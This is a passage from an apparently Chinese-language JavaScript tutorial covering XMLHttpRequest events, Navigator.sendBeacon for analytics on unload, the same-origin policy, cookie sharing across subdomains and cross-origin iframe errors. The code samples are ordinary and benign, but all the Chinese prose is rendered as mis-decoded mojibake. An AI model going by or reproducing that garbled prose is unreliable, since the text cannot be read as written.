<h4 id="progress-äº‹ä»¶"><a href="#progress-äº‹ä»¶" class="headerlink" title="progress äº‹ä»¶"></a>progress äº‹ä»¶</h4><p>ä¸Šä¼ æ–‡ä»¶æ—¶ï¼ŒXMLHttpRequest å®ä¾‹å¯¹è±¡æœ¬èº«å’Œå®ä¾‹çš„<code>upload</code>å±æ€§ï¼Œéƒ½æœ‰ä¸€ä¸ª<code>progress</code>äº‹ä»¶ï¼Œä¼šä¸æ–­è¿”å›ä¸Šä¼ çš„è¿›åº¦ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">var xhr &#x3D; new XMLHttpRequest();</span><br><span class="line"></span><br><span class="line">function updateProgress (oEvent) &#123;</span><br><span class="line">  if (oEvent.lengthComputable) &#123;</span><br><span class="line">    var percentComplete &#x3D; oEvent.loaded &#x2F; oEvent.total;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    console.log(&#39;æ— æ³•è®¡ç®—è¿›å±•&#39;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">xhr.addEventListener(&#39;progress&#39;, updateProgress);</span><br><span class="line"></span><br><span class="line">xhr.open();</span><br></pre></td></tr></table></figure>

<h4 id="load-äº‹ä»¶ã€error-äº‹ä»¶ã€abort-äº‹ä»¶"><a href="#load-äº‹ä»¶ã€error-äº‹ä»¶ã€abort-äº‹ä»¶" class="headerlink" title="load äº‹ä»¶ã€error äº‹ä»¶ã€abort äº‹ä»¶"></a>load äº‹ä»¶ã€error äº‹ä»¶ã€abort äº‹ä»¶</h4><p>load äº‹ä»¶è¡¨ç¤ºæœåŠ¡å™¨ä¼ æ¥çš„æ•°æ®æ¥æ”¶å®Œæ¯•ï¼Œerror äº‹ä»¶è¡¨ç¤ºè¯·æ±‚å‡ºé”™ï¼Œabort äº‹ä»¶è¡¨ç¤ºè¯·æ±‚è¢«ä¸­æ–­ï¼ˆæ¯”å¦‚ç”¨æˆ·å–æ¶ˆè¯·æ±‚ï¼‰ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">var xhr &#x3D; new XMLHttpRequest();</span><br><span class="line"></span><br><span class="line">xhr.addEventListener(&#39;load&#39;, transferComplete);</span><br><span class="line">xhr.addEventListener(&#39;error&#39;, transferFailed);</span><br><span class="line">xhr.addEventListener(&#39;abort&#39;, transferCanceled);</span><br><span class="line"></span><br><span class="line">xhr.open();</span><br><span class="line"></span><br><span class="line">function transferComplete() &#123;</span><br><span class="line">  console.log(&#39;æ•°æ®æ¥æ”¶å®Œæ¯•&#39;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function transferFailed() &#123;</span><br><span class="line">  console.log(&#39;æ•°æ®æ¥æ”¶å‡ºé”™&#39;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function transferCanceled() &#123;</span><br><span class="line">  console.log(&#39;ç”¨æˆ·å–æ¶ˆæ¥æ”¶&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="loadend-äº‹ä»¶"><a href="#loadend-äº‹ä»¶" class="headerlink" title="loadend äº‹ä»¶"></a>loadend äº‹ä»¶</h4><p><code>abort</code>ã€<code>load</code>å’Œ<code>error</code>è¿™ä¸‰ä¸ªäº‹ä»¶ï¼Œä¼šä¼´éšä¸€ä¸ª<code>loadend</code>äº‹ä»¶ï¼Œè¡¨ç¤ºè¯·æ±‚ç»“æŸï¼Œä½†ä¸çŸ¥é“å…¶æ˜¯å¦æˆåŠŸã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">xhr.addEventListener(&#39;loadend&#39;, loadEnd);</span><br><span class="line"></span><br><span class="line">function loadEnd(e) &#123;</span><br><span class="line">  console.log(&#39;è¯·æ±‚ç»“æŸï¼ŒçŠ¶æ€æœªçŸ¥&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="timeout-äº‹ä»¶"><a href="#timeout-äº‹ä»¶" class="headerlink" title="timeout äº‹ä»¶"></a>timeout äº‹ä»¶</h4><p>æœåŠ¡å™¨è¶…è¿‡æŒ‡å®šæ—¶é—´è¿˜æ²¡æœ‰è¿”å›ç»“æœï¼Œå°±ä¼šè§¦å‘ timeout äº‹ä»¶ï¼Œå…·ä½“çš„ä¾‹å­å‚è§<code>timeout</code>å±æ€§ä¸€èŠ‚ã€‚</p>
<h3 id="Navigator-sendBeacon-1"><a href="#Navigator-sendBeacon-1" class="headerlink" title="Navigator.sendBeacon()"></a>Navigator.sendBeacon()</h3><p>ç”¨æˆ·å¸è½½ç½‘é¡µçš„æ—¶å€™ï¼Œæœ‰æ—¶éœ€è¦å‘æœåŠ¡å™¨å‘ä¸€äº›æ•°æ®ã€‚å¾ˆè‡ªç„¶çš„åšæ³•æ˜¯åœ¨<code>unload</code>äº‹ä»¶æˆ–<code>beforeunload</code>äº‹ä»¶çš„ç›‘å¬å‡½æ•°é‡Œé¢ï¼Œä½¿ç”¨<code>XMLHttpRequest</code>å¯¹è±¡å‘é€æ•°æ®ã€‚ä½†æ˜¯ï¼Œè¿™æ ·åšä¸æ˜¯å¾ˆå¯é ï¼Œå› ä¸º<code>XMLHttpRequest</code>å¯¹è±¡æ˜¯å¼‚æ­¥å‘é€ï¼Œå¾ˆå¯èƒ½åœ¨å®ƒå³å°†å‘é€çš„æ—¶å€™ï¼Œé¡µé¢å·²ç»å¸è½½äº†ï¼Œä»è€Œå¯¼è‡´å‘é€å–æ¶ˆæˆ–è€…å‘é€å¤±è´¥ã€‚</p>
<p>è§£å†³æ–¹æ³•å°±æ˜¯<code>unload</code>äº‹ä»¶é‡Œé¢ï¼ŒåŠ ä¸€äº›å¾ˆè€—æ—¶çš„åŒæ­¥æ“ä½œã€‚è¿™æ ·å°±èƒ½ç•™å‡ºè¶³å¤Ÿçš„æ—¶é—´ï¼Œä¿è¯å¼‚æ­¥ AJAX èƒ½å¤Ÿå‘é€æˆåŠŸã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function log() &#123;</span><br><span class="line">  let xhr &#x3D; new XMLHttpRequest();</span><br><span class="line">  xhr.open(&#39;post&#39;, &#39;&#x2F;log&#39;, true);</span><br><span class="line">  xhr.setRequestHeader(&#39;Content-Type&#39;, &#39;application&#x2F;x-www-form-urlencoded&#39;);</span><br><span class="line">  xhr.send(&#39;foo&#x3D;bar&#39;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">window.addEventListener(&#39;unload&#39;, function(event) &#123;</span><br><span class="line">  log();</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; a time-consuming operation</span><br><span class="line">  for (let i &#x3D; 1; i &lt; 10000; i++) &#123;</span><br><span class="line">    for (let m &#x3D; 1; m &lt; 10000; m++) &#123; continue; &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä¸­ï¼Œå¼ºåˆ¶æ‰§è¡Œäº†ä¸€æ¬¡åŒé‡å¾ªç¯ï¼Œæ‹–é•¿äº†<code>unload</code>äº‹ä»¶çš„æ‰§è¡Œæ—¶é—´ï¼Œå¯¼è‡´å¼‚æ­¥ AJAX èƒ½å¤Ÿå‘é€æˆåŠŸã€‚</p>
<p>ç±»ä¼¼çš„è¿˜å¯ä»¥ä½¿ç”¨<code>setTimeout</code>ã€‚ä¸‹é¢æ˜¯è¿½è¸ªç”¨æˆ·ç‚¹å‡»çš„ä¾‹å­ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; HTML ä»£ç å¦‚ä¸‹</span><br><span class="line">&#x2F;&#x2F; &lt;a id&#x3D;&quot;target&quot; href&#x3D;&quot;https:&#x2F;&#x2F;baidu.com&quot;&gt;click&lt;&#x2F;a&gt;</span><br><span class="line">const clickTime &#x3D; 350;</span><br><span class="line">const theLink &#x3D; document.getElementById(&#39;target&#39;);</span><br><span class="line"></span><br><span class="line">function log() &#123;</span><br><span class="line">  let xhr &#x3D; new XMLHttpRequest();</span><br><span class="line">  xhr.open(&#39;post&#39;, &#39;&#x2F;log&#39;, true);</span><br><span class="line">  xhr.setRequestHeader(&#39;Content-Type&#39;, &#39;application&#x2F;x-www-form-urlencoded&#39;);</span><br><span class="line">  xhr.send(&#39;foo&#x3D;bar&#39;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">theLink.addEventListener(&#39;click&#39;, function (event) &#123;</span><br><span class="line">  event.preventDefault();</span><br><span class="line">  log();</span><br><span class="line"></span><br><span class="line">  setTimeout(function () &#123;</span><br><span class="line">    window.location.href &#x3D; theLink.getAttribute(&#39;href&#39;);</span><br><span class="line">  &#125;, clickTime);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä½¿ç”¨<code>setTimeout</code>ï¼Œæ‹–å»¶äº†350æ¯«ç§’ï¼Œæ‰è®©é¡µé¢è·³è½¬ï¼Œå› æ­¤ä½¿å¾—å¼‚æ­¥ AJAX æœ‰æ—¶é—´å‘å‡ºã€‚</p>
<p>è¿™äº›åšæ³•çš„å…±åŒé—®é¢˜æ˜¯ï¼Œå¸è½½çš„æ—¶é—´è¢«ç¡¬ç”Ÿç”Ÿæ‹–é•¿äº†ï¼Œåé¢é¡µé¢çš„åŠ è½½è¢«æ¨è¿Ÿäº†ï¼Œç”¨æˆ·ä½“éªŒä¸å¥½ã€‚</p>
<p>ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæµè§ˆå™¨å¼•å…¥äº†<code>Navigator.sendBeacon()</code>æ–¹æ³•ã€‚è¿™ä¸ªæ–¹æ³•è¿˜æ˜¯å¼‚æ­¥å‘å‡ºè¯·æ±‚ï¼Œä½†æ˜¯è¯·æ±‚ä¸å½“å‰é¡µé¢çº¿ç¨‹è„±é’©ï¼Œä½œä¸ºæµè§ˆå™¨è¿›ç¨‹çš„ä»»åŠ¡ï¼Œå› æ­¤å¯ä»¥ä¿è¯ä¼šæŠŠæ•°æ®å‘å‡ºå»ï¼Œä¸æ‹–å»¶å¸è½½æµç¨‹ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">window.addEventListener(&#39;unload&#39;, logData, false);</span><br><span class="line"></span><br><span class="line">function logData() &#123;</span><br><span class="line">  navigator.sendBeacon(&#39;&#x2F;log&#39;, analyticsData);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>Navigator.sendBeacon</code>æ–¹æ³•æ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç›®æ ‡æœåŠ¡å™¨çš„ URLï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯æ‰€è¦å‘é€çš„æ•°æ®ï¼ˆå¯é€‰ï¼‰ï¼Œå¯ä»¥æ˜¯ä»»æ„ç±»å‹ï¼ˆå­—ç¬¦ä¸²ã€è¡¨å•å¯¹è±¡ã€äºŒè¿›åˆ¶å¯¹è±¡ç­‰ç­‰ï¼‰ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">navigator.sendBeacon(url, data)</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªæ–¹æ³•çš„è¿”å›å€¼æ˜¯ä¸€ä¸ªå¸ƒå°”å€¼ï¼ŒæˆåŠŸå‘é€æ•°æ®ä¸º<code>true</code>ï¼Œå¦åˆ™ä¸º<code>false</code>ã€‚</p>
<p>è¯¥æ–¹æ³•å‘é€æ•°æ®çš„ HTTP æ–¹æ³•æ˜¯ POSTï¼Œå¯ä»¥è·¨åŸŸï¼Œç±»ä¼¼äºè¡¨å•æäº¤æ•°æ®ã€‚å®ƒä¸èƒ½æŒ‡å®šå›è°ƒå‡½æ•°ã€‚</p>
<p>ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; HTML ä»£ç å¦‚ä¸‹</span><br><span class="line">&#x2F;&#x2F; &lt;body onload&#x3D;&quot;analytics(&#39;start&#39;)&quot; onunload&#x3D;&quot;analytics(&#39;end&#39;)&quot;&gt;</span><br><span class="line"></span><br><span class="line">function analytics(state) &#123;</span><br><span class="line">  if (!navigator.sendBeacon) return;</span><br><span class="line"></span><br><span class="line">  var URL &#x3D; &#39;http:&#x2F;&#x2F;example.com&#x2F;analytics&#39;;</span><br><span class="line">  var data &#x3D; &#39;state&#x3D;&#39; + state + &#39;&amp;location&#x3D;&#39; + window.location;</span><br><span class="line">  navigator.sendBeacon(URL, data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="åŒæºé™åˆ¶"><a href="#åŒæºé™åˆ¶" class="headerlink" title="åŒæºé™åˆ¶"></a>åŒæºé™åˆ¶</h2><p>æµè§ˆå™¨å®‰å…¨çš„åŸºçŸ³æ˜¯â€œåŒæºæ”¿ç­–â€ï¼ˆ<a href="https://en.wikipedia.org/wiki/Same-origin_policy" target="_blank" rel="noopener">same-origin policy</a>ï¼‰ã€‚å¾ˆå¤šå¼€å‘è€…éƒ½çŸ¥é“è¿™ä¸€ç‚¹ï¼Œä½†äº†è§£å¾—ä¸å…¨é¢ã€‚</p>
<h3 id="æ¦‚è¿°-2"><a href="#æ¦‚è¿°-2" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h3><h4 id="å«ä¹‰"><a href="#å«ä¹‰" class="headerlink" title="å«ä¹‰"></a>å«ä¹‰</h4><p>1995å¹´ï¼ŒåŒæºæ”¿ç­–ç”± Netscape å…¬å¸å¼•å…¥æµè§ˆå™¨ã€‚ç›®å‰ï¼Œæ‰€æœ‰æµè§ˆå™¨éƒ½å®è¡Œè¿™ä¸ªæ”¿ç­–ã€‚</p>
<p>æœ€åˆï¼Œå®ƒçš„å«ä¹‰æ˜¯æŒ‡ï¼ŒA ç½‘é¡µè®¾ç½®çš„ Cookieï¼ŒB ç½‘é¡µä¸èƒ½æ‰“å¼€ï¼Œé™¤éè¿™ä¸¤ä¸ªç½‘é¡µâ€œåŒæºâ€ã€‚æ‰€è°“â€œåŒæºâ€æŒ‡çš„æ˜¯â€œä¸‰ä¸ªç›¸åŒâ€ã€‚</p>
<blockquote>
<ul>
<li>åè®®ç›¸åŒ</li>
<li>åŸŸåç›¸åŒ</li>
<li>ç«¯å£ç›¸åŒï¼ˆè¿™ç‚¹å¯ä»¥å¿½ç•¥ï¼Œè¯¦è§ä¸‹æ–‡ï¼‰</li>
</ul>
</blockquote>
<p>ä¸¾ä¾‹æ¥è¯´ï¼Œ<code>http://www.example.com/dir/page.html</code>è¿™ä¸ªç½‘å€ï¼Œåè®®æ˜¯<code>http://</code>ï¼ŒåŸŸåæ˜¯<code>www.example.com</code>ï¼Œç«¯å£æ˜¯<code>80</code>ï¼ˆé»˜è®¤ç«¯å£å¯ä»¥çœç•¥ï¼‰ï¼Œå®ƒçš„åŒæºæƒ…å†µå¦‚ä¸‹ã€‚</p>
<ul>
<li><code>http://www.example.com/dir2/other.html</code>ï¼šåŒæº</li>
<li><code>http://example.com/dir/other.html</code>ï¼šä¸åŒæºï¼ˆåŸŸåä¸åŒï¼‰</li>
<li><code>http://v2.www.example.com/dir/other.html</code>ï¼šä¸åŒæºï¼ˆåŸŸåä¸åŒï¼‰</li>
<li><code>http://www.example.com:81/dir/other.html</code>ï¼šä¸åŒæºï¼ˆç«¯å£ä¸åŒï¼‰</li>
<li><code>https://www.example.com/dir/page.html</code>ï¼šä¸åŒæºï¼ˆåè®®ä¸åŒï¼‰</li>
</ul>
<p>æ³¨æ„ï¼Œæ ‡å‡†è§„å®šç«¯å£ä¸åŒçš„ç½‘å€ä¸æ˜¯åŒæºï¼ˆæ¯”å¦‚8000ç«¯å£å’Œ8001ç«¯å£ä¸æ˜¯åŒæºï¼‰ï¼Œä½†æ˜¯æµè§ˆå™¨æ²¡æœ‰éµå®ˆè¿™æ¡è§„å®šã€‚å®é™…ä¸Šï¼ŒåŒä¸€ä¸ªç½‘åŸŸçš„ä¸åŒç«¯å£ï¼Œæ˜¯å¯ä»¥äº’ç›¸è¯»å– Cookie çš„ã€‚</p>
<h4 id="ç›®çš„"><a href="#ç›®çš„" class="headerlink" title="ç›®çš„"></a>ç›®çš„</h4><p>åŒæºæ”¿ç­–çš„ç›®çš„ï¼Œæ˜¯ä¸ºäº†ä¿è¯ç”¨æˆ·ä¿¡æ¯çš„å®‰å…¨ï¼Œé˜²æ­¢æ¶æ„çš„ç½‘ç«™çªƒå–æ•°æ®ã€‚</p>
<p>è®¾æƒ³è¿™æ ·ä¸€ç§æƒ…å†µï¼šA ç½‘ç«™æ˜¯ä¸€å®¶é“¶è¡Œï¼Œç”¨æˆ·ç™»å½•ä»¥åï¼ŒA ç½‘ç«™åœ¨ç”¨æˆ·çš„æœºå™¨ä¸Šè®¾ç½®äº†ä¸€ä¸ª Cookieï¼ŒåŒ…å«äº†ä¸€äº›éšç§ä¿¡æ¯ã€‚ç”¨æˆ·ç¦»å¼€ A ç½‘ç«™ä»¥åï¼Œåˆå»è®¿é—® B ç½‘ç«™ï¼Œå¦‚æœæ²¡æœ‰åŒæºé™åˆ¶ï¼ŒB ç½‘ç«™å¯ä»¥è¯»å– A ç½‘ç«™çš„ Cookieï¼Œé‚£ä¹ˆéšç§å°±æ³„æ¼äº†ã€‚æ›´å¯æ€•çš„æ˜¯ï¼ŒCookie å¾€å¾€ç”¨æ¥ä¿å­˜ç”¨æˆ·çš„ç™»å½•çŠ¶æ€ï¼Œå¦‚æœç”¨æˆ·æ²¡æœ‰é€€å‡ºç™»å½•ï¼Œå…¶ä»–ç½‘ç«™å°±å¯ä»¥å†’å……ç”¨æˆ·ï¼Œä¸ºæ‰€æ¬²ä¸ºã€‚å› ä¸ºæµè§ˆå™¨åŒæ—¶è¿˜è§„å®šï¼Œæäº¤è¡¨å•ä¸å—åŒæºæ”¿ç­–çš„é™åˆ¶ã€‚</p>
<p>ç”±æ­¤å¯è§ï¼ŒåŒæºæ”¿ç­–æ˜¯å¿…éœ€çš„ï¼Œå¦åˆ™ Cookie å¯ä»¥å…±äº«ï¼Œäº’è”ç½‘å°±æ¯«æ— å®‰å…¨å¯è¨€äº†ã€‚</p>
<h4 id="é™åˆ¶èŒƒå›´"><a href="#é™åˆ¶èŒƒå›´" class="headerlink" title="é™åˆ¶èŒƒå›´"></a>é™åˆ¶èŒƒå›´</h4><p>éšç€äº’è”ç½‘çš„å‘å±•ï¼ŒåŒæºæ”¿ç­–è¶Šæ¥è¶Šä¸¥æ ¼ã€‚ç›®å‰ï¼Œå¦‚æœéåŒæºï¼Œå…±æœ‰ä¸‰ç§è¡Œä¸ºå—åˆ°é™åˆ¶ã€‚</p>
<blockquote>
<p>ï¼ˆ1ï¼‰ æ— æ³•è¯»å–éåŒæºç½‘é¡µçš„ Cookieã€LocalStorage å’Œ IndexedDBã€‚</p>
<p>ï¼ˆ2ï¼‰ æ— æ³•æ¥è§¦éåŒæºç½‘é¡µçš„ DOMã€‚</p>
<p>ï¼ˆ3ï¼‰ æ— æ³•å‘éåŒæºåœ°å€å‘é€ AJAX è¯·æ±‚ï¼ˆå¯ä»¥å‘é€ï¼Œä½†æµè§ˆå™¨ä¼šæ‹’ç»æ¥å—å“åº”ï¼‰ã€‚</p>
</blockquote>
<p>å¦å¤–ï¼Œé€šè¿‡ JavaScript è„šæœ¬å¯ä»¥æ‹¿åˆ°å…¶ä»–çª—å£çš„<code>window</code>å¯¹è±¡ã€‚å¦‚æœæ˜¯éåŒæºçš„ç½‘é¡µï¼Œç›®å‰å…è®¸ä¸€ä¸ªçª—å£å¯ä»¥æ¥è§¦å…¶ä»–ç½‘é¡µçš„<code>window</code>å¯¹è±¡çš„ä¹ä¸ªå±æ€§å’Œå››ä¸ªæ–¹æ³•ã€‚</p>
<ul>
<li>window.closed</li>
<li>window.frames</li>
<li>window.length</li>
<li>window.location</li>
<li>window.opener</li>
<li>window.parent</li>
<li>window.self</li>
<li>window.top</li>
<li>window.window</li>
<li>window.blur()</li>
<li>window.close()</li>
<li>window.focus()</li>
<li>window.postMessage()</li>
</ul>
<p>ä¸Šé¢çš„ä¹ä¸ªå±æ€§ä¹‹ä¸­ï¼Œåªæœ‰<code>window.location</code>æ˜¯å¯è¯»å†™çš„ï¼Œå…¶ä»–å…«ä¸ªå…¨éƒ¨éƒ½æ˜¯åªè¯»ã€‚è€Œä¸”ï¼Œå³ä½¿æ˜¯<code>location</code>å¯¹è±¡ï¼ŒéåŒæºçš„æƒ…å†µä¸‹ï¼Œä¹Ÿåªå…è®¸è°ƒç”¨<code>location.replace()</code>æ–¹æ³•å’Œå†™å…¥<code>location.href</code>å±æ€§ã€‚</p>
<p>è™½ç„¶è¿™äº›é™åˆ¶æ˜¯å¿…è¦çš„ï¼Œä½†æ˜¯æœ‰æ—¶å¾ˆä¸æ–¹ä¾¿ï¼Œåˆç†çš„ç”¨é€”ä¹Ÿå—åˆ°å½±å“ã€‚ä¸‹é¢ä»‹ç»å¦‚ä½•è§„é¿ä¸Šé¢çš„é™åˆ¶ã€‚</p>
<h3 id="Cookie-1"><a href="#Cookie-1" class="headerlink" title="Cookie"></a>Cookie</h3><p>Cookie æ˜¯æœåŠ¡å™¨å†™å…¥æµè§ˆå™¨çš„ä¸€å°æ®µä¿¡æ¯ï¼Œåªæœ‰åŒæºçš„ç½‘é¡µæ‰èƒ½å…±äº«ã€‚å¦‚æœä¸¤ä¸ªç½‘é¡µä¸€çº§åŸŸåç›¸åŒï¼Œåªæ˜¯æ¬¡çº§åŸŸåä¸åŒï¼Œæµè§ˆå™¨å…è®¸é€šè¿‡è®¾ç½®<code>document.domain</code>å…±äº« Cookieã€‚</p>
<p>ä¸¾ä¾‹æ¥è¯´ï¼ŒA ç½‘é¡µçš„ç½‘å€æ˜¯<code>http://w1.example.com/a.html</code>ï¼ŒB ç½‘é¡µçš„ç½‘å€æ˜¯<code>http://w2.example.com/b.html</code>ï¼Œé‚£ä¹ˆåªè¦è®¾ç½®ç›¸åŒçš„<code>document.domain</code>ï¼Œä¸¤ä¸ªç½‘é¡µå°±å¯ä»¥å…±äº« Cookieã€‚å› ä¸ºæµè§ˆå™¨é€šè¿‡<code>document.domain</code>å±æ€§æ¥æ£€æŸ¥æ˜¯å¦åŒæºã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; ä¸¤ä¸ªç½‘é¡µéƒ½éœ€è¦è®¾ç½®</span><br><span class="line">document.domain &#x3D; &#39;example.com&#39;;</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„ï¼ŒA å’Œ B ä¸¤ä¸ªç½‘é¡µéƒ½éœ€è¦è®¾ç½®<code>document.domain</code>å±æ€§ï¼Œæ‰èƒ½è¾¾åˆ°åŒæºçš„ç›®çš„ã€‚å› ä¸ºè®¾ç½®<code>document.domain</code>çš„åŒæ—¶ï¼Œä¼šæŠŠç«¯å£é‡ç½®ä¸º<code>null</code>ï¼Œå› æ­¤å¦‚æœåªè®¾ç½®ä¸€ä¸ªç½‘é¡µçš„<code>document.domain</code>ï¼Œä¼šå¯¼è‡´ä¸¤ä¸ªç½‘å€çš„ç«¯å£ä¸åŒï¼Œè¿˜æ˜¯è¾¾ä¸åˆ°åŒæºçš„ç›®çš„ã€‚</p>
<p>ç°åœ¨ï¼ŒA ç½‘é¡µé€šè¿‡è„šæœ¬è®¾ç½®ä¸€ä¸ª Cookieã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.cookie &#x3D; &quot;test1&#x3D;hello&quot;;</span><br></pre></td></tr></table></figure>

<p>B ç½‘é¡µå°±å¯ä»¥è¯»åˆ°è¿™ä¸ª Cookieã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var allCookie &#x3D; document.cookie;</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„ï¼Œè¿™ç§æ–¹æ³•åªé€‚ç”¨äº Cookie å’Œ iframe çª—å£ï¼ŒLocalStorage å’Œ IndexedDB æ— æ³•é€šè¿‡è¿™ç§æ–¹æ³•ï¼Œè§„é¿åŒæºæ”¿ç­–ï¼Œè€Œè¦ä½¿ç”¨ä¸‹æ–‡ä»‹ç» PostMessage APIã€‚</p>
<p>å¦å¤–ï¼ŒæœåŠ¡å™¨ä¹Ÿå¯ä»¥åœ¨è®¾ç½® Cookie çš„æ—¶å€™ï¼ŒæŒ‡å®š Cookie çš„æ‰€å±åŸŸåä¸ºä¸€çº§åŸŸåï¼Œæ¯”å¦‚<code>example.com</code>ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: key&#x3D;value; domain&#x3D;example.com; path&#x3D;&#x2F;</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·çš„è¯ï¼ŒäºŒçº§åŸŸåå’Œä¸‰çº§åŸŸåä¸ç”¨åšä»»ä½•è®¾ç½®ï¼Œéƒ½å¯ä»¥è¯»å–è¿™ä¸ª Cookieã€‚</p>
<h3 id="iframe-å’Œå¤šçª—å£é€šä¿¡"><a href="#iframe-å’Œå¤šçª—å£é€šä¿¡" class="headerlink" title="iframe å’Œå¤šçª—å£é€šä¿¡"></a>iframe å’Œå¤šçª—å£é€šä¿¡</h3><p><code>iframe</code>å…ƒç´ å¯ä»¥åœ¨å½“å‰ç½‘é¡µä¹‹ä¸­ï¼ŒåµŒå…¥å…¶ä»–ç½‘é¡µã€‚æ¯ä¸ª<code>iframe</code>å…ƒç´ å½¢æˆè‡ªå·±çš„çª—å£ï¼Œå³æœ‰è‡ªå·±çš„<code>window</code>å¯¹è±¡ã€‚<code>iframe</code>çª—å£ä¹‹ä¸­çš„è„šæœ¬ï¼Œå¯ä»¥è·å¾—çˆ¶çª—å£å’Œå­çª—å£ã€‚ä½†æ˜¯ï¼Œåªæœ‰åœ¨åŒæºçš„æƒ…å†µä¸‹ï¼Œçˆ¶çª—å£å’Œå­çª—å£æ‰èƒ½é€šä¿¡ï¼›å¦‚æœè·¨åŸŸï¼Œå°±æ— æ³•æ‹¿åˆ°å¯¹æ–¹çš„ DOMã€‚</p>
<p>æ¯”å¦‚ï¼Œçˆ¶çª—å£è¿è¡Œä¸‹é¢çš„å‘½ä»¤ï¼Œå¦‚æœ<code>iframe</code>çª—å£ä¸æ˜¯åŒæºï¼Œå°±ä¼šæŠ¥é”™ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">document</span><br><span class="line">.getElementById(&quot;myIFrame&quot;)</span><br><span class="line">.contentWindow</span><br><span class="line">.document</span><br><span class="line">&#x2F;&#x2F; Uncaught DOMException: Blocked a frame from accessing a cross-origin frame.</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢å‘½ä»¤ä¸­ï¼Œçˆ¶çª—å£æƒ³è·å–å­çª—å£çš„ DOMï¼Œå› ä¸ºè·¨åŸŸå¯¼è‡´æŠ¥é”™ã€‚</p>
